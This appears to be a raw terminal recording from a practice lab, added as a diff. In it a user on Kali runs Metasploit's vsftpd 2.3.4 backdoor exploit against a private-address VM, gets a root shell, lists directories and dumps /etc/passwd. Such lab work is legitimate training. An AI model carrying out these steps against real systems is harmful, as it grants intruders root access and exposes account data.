@@ -1,0 +1,123 @@
+Script started on 2025-08-31 08:31:04-04:00 [TERM="xterm-256color" TTY="/dev/pts/0" COLUMNS="235" LINES="59"]
+                                                                                                                                                                                                                                           ]0;kali@kali: ~[0m[27m[24m[J[32m┌──([1m[32m[34mkali㉿kali[0m[34m[32m)-[[1m[32m[39m~[0m[32m]
+└─[1m[32m[34m$[0m[34m[39m [K[?1h=[?2004hm[4mm[24m[4mm[24m[38;2;153;153;153msfconsole[39m[9D[9C[10D[24m[36mm[36ms[36mf[36mc[36mo[36mn[36ms[36mo[36ml[36me[39m[?1l>[?2004l
+Metasploit tip: Use help <command> to learn more about any command
+[*] Starting the Metasploit Framework console.../[*] Starting the Metasploit Framework console...-[*] Starting the Metasploit Framework console...\[*] starting the Metasploit Framework console...|[*] STarting the Metasploit Framework console.../[*] StArting the Metasploit Framework console...-[*] StaRting the Metasploit Framework console...\[*] StarTing the Metasploit Framework console...|[*] StartIng the Metasploit Framework console.../[*] StartiNg the Metasploit Framework console...-[*] StartinG the Metasploit Framework console...\[*] Starting the Metasploit Framework console...|[*] Starting The Metasploit Framework console.../[*] Starting tHe Metasploit Framework console...-[*] Starting thE Metasploit Framework console...\[*] Starting the Metasploit Framework console...|[*] Starting the metasploit Framework console.../[*] Starting the MEtasploit Framework console...-[*] Starting the MeTasploit Framework console...\                                                  
+[0m[36m     ,           ,
+    /             \
+   ((__---,,,---__))
+      (_) O O (_)_________
+         \ _ /            |\
+          o_o \   M S F   | \
+               \   _____  |  *
+                |||   WW|||
+                |||     |||
+[0m
+
+       =[ [33mmetasploit v6.4.64-dev[0m                          ]
++ -- --=[ 2519 exploits - 1296 auxiliary - 431 post       ]
++ -- --=[ 1610 payloads - 49 encoders - 13 nops           ]
++ -- --=[ 9 evasion                                       ]
+
+Metasploit Documentation: https://docs.metasploit.com/
+
+[?1034h[4mmsf6[0m [0m> use exploit/unix/ftp/vsftpd_234_backdoor 
+[0m[1m[34m[*][0m No payload configured, defaulting to cmd/unix/interact
+[4mmsf6[0m exploit([1m[31munix/ftp/vsftpd_234_backdoor[0m) [0m> rhost 192.168.4[K56.102
+[0m[1m[31m[-][0m Unknown command: rhost. Did you mean [32mhosts[0m? Run the [32mhelp[0m command for more details.
+[4mmsf6[0m exploit([1m[31munix/ftp/vsftpd_234_backdoor[0m) [0m> -se[K[K[Kstee[K[K[Ket rhs[Kost 192.168.56.120[K[K02
+[0mrhost => 192.168.56.102
+[4mmsf6[0m exploit([1m[31munix/ftp/vsftpd_234_backdoor[0m) [0m> set rport 21
+[0mrport => 21
+[4mmsf6[0m exploit([1m[31munix/ftp/vsftpd_234_backdoor[0m) [0m> run
+[0m[1m[34m[*][0m 192.168.56.102:21 - Banner: 220 (vsFTPd 2.3.4)
+[1m[34m[*][0m 192.168.56.102:21 - USER: 331 Please specify the password.
+[1m[34m[*][0m Exploit completed, but no session was created.
+[4mmsf6[0m exploit([1m[31munix/ftp/vsftpd_234_backdoor[0m) [0m> run
+[0m[1m[34m[*][0m 192.168.56.102:21 - Banner: 220 (vsFTPd 2.3.4)
+[1m[34m[*][0m 192.168.56.102:21 - USER: 331 Please specify the password.
+[1m[32m[+][0m 192.168.56.102:21 - Backdoor service has been spawned, handling...
+[1m[32m[+][0m 192.168.56.102:21 - UID: uid=0(root) gid=0(root)
+[1m[34m[*][0m Found shell.
+cd [1m[34m[*][0m Command shell session 1 opened (192.168.56.101:36661 -> 192.168.56.102:6200) at 2025-08-31 08:33:58 -0400
+
+[0mcd /home
+sh: line 6: cd: cd: No such file or directory
+ls 
+bin
+boot
+cdrom
+dev
+etc
+home
+initrd
+initrd.img
+lib
+lost+found
+media
+mnt
+nohup.out
+opt
+proc
+root
+sbin
+srv
+sys
+tmp
+usr
+var
+vmlinuz
+pwd
+/
+cd ho  /home     ho ome
+ls
+ftp
+msfadmin
+service
+user
+cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+bin:x:2:2:bin:/bin:/bin/sh
+sys:x:3:3:sys:/dev:/bin/sh
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/bin/sh
+man:x:6:12:man:/var/cache/man:/bin/sh
+lp:x:7:7:lp:/var/spool/lpd:/bin/sh
+mail:x:8:8:mail:/var/mail:/bin/sh
+news:x:9:9:news:/var/spool/news:/bin/sh
+uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
+proxy:x:13:13:proxy:/bin:/bin/sh
+www-data:x:33:33:www-data:/var/www:/bin/sh
+backup:x:34:34:backup:/var/backups:/bin/sh
+list:x:38:38:Mailing List Manager:/var/list:/bin/sh
+irc:x:39:39:ircd:/var/run/ircd:/bin/sh
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
+nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
+libuuid:x:100:101::/var/lib/libuuid:/bin/sh
+dhcp:x:101:102::/nonexistent:/bin/false
+syslog:x:102:103::/home/syslog:/bin/false
+klog:x:103:104::/home/klog:/bin/false
+sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin
+msfadmin:x:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash
+bind:x:105:113::/var/cache/bind:/bin/false
+postfix:x:106:115::/var/spool/postfix:/bin/false
+ftp:x:107:65534::/home/ftp:/bin/false
+postgres:x:108:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
+mysql:x:109:118:MySQL Server,,,:/var/lib/mysql:/bin/false
+tomcat55:x:110:65534::/usr/share/tomcat5.5:/bin/false
+distccd:x:111:65534::/:/bin/false
+user:x:1001:1001:just a user,111,,:/home/user:/bin/bash
+service:x:1002:1002:,,,:/home/service:/bin/bash
+telnetd:x:112:120::/nonexistent:/bin/false
+proftpd:x:113:65534::/var/run/proftpd:/bin/false
+statd:x:114:65534::/var/lib/nfs:/bin/false
+background
+
+Background session 1? [y/N]  y
+[4mmsf6[0m exploit([1m[31munix/ftp/vsftpd_234_backdoor[0m) [0m> exit -y
+[0m                                                                                                                                                                                                                                           ]0;kali@kali: ~
+[0m[27m[24m[J[32m┌──([1m[32m[34mkali㉿kali[0m[34m[32m)-[[1m[32m[39m~[0m[32m]
+└─[1m[32m[34m$[0m[34m[39m [K[?1h=[?2004h[?2004l
+
+Script done on 2025-08-31 08:36:49-04:00 [COMMAND_EXIT_CODE="0"]
